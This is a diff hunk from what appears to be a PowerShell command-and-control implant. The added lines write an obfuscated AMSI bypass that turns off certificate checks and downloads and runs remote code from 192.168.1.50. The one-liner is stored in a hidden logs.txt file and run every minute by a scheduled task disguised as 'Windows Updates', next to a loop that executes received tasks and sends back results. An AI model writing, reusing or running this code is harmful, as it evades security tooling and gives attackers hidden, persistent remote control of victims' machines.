@@ -108,11 +108,22 @@ $taskl   = ("https" + ':' + "//$ip" + ':' + "$port/tasks/$name/")    # --> https
 $resultl = ("https" + ':' + "//$ip" + ':' + "$port/results/$name/")
 
 #echo PAYLOAD into file
-#schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr 'C:\Windows\System32\cmd.exe /c "echo [cat the payload file] | powershell -ep bypass " ' /F
+$oneliner = "`$apple=[Ref].Assembly.GetTypes();ForEach(`$banana in `$apple) {if (`$banana.Name -like `"*siUtils`") {`$cherry=`$banana}};`$dogwater=`$cherry.GetFields('NonPublic,Static');ForEach(`$earache in `$dogwater) {if (`$earache.Name -like `"`*InitFailed`") {`$foxhole=`$earache}};`$foxhole.SetValue(`$null,`$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}; IEX(New-Object Net.WebClient).DownloadString('https://192.168.1.50:8000/sc/eth0')"
+echo $oneliner > "C:\Users\$env:USERNAME\Documents\logs.txt"
 
-#PAYLOAD : $apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields('NonPublic,Static');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX(New-Object Net.WebClient).DownloadString('https://$ip:$port/sc/eth0') 
-#C:\Windows\System32\cmd.exe /c "echo [PAYLOAD] | powershell -ep bypass"
+#Set permission to be accsesible
+$acl = Get-Acl C:\Users\$env:USERNAME\Documents\logs.txt
+$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("$env:USERNAME","FullControl","Allow")
+$acl.SetAccessRule($AccessRule)
+$acl | Set-Acl C:\Users\$env:USERNAME\Documents\logs.txt
 
+
+#hide the file
+$FILE=Get-Item '~\Documents\logs.txt' -Force
+$FILE.attributes='Hidden'
+
+#schadule a task to run the oneliner
+schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "C:\Windows\System32\cmd.exe /c type %USERPROFILE%\Documents\logs.txt | powershell -ep bypass" /F
 
 #Loop to check for tasks, recieve, execute & sends results in result Link
 for (;;){
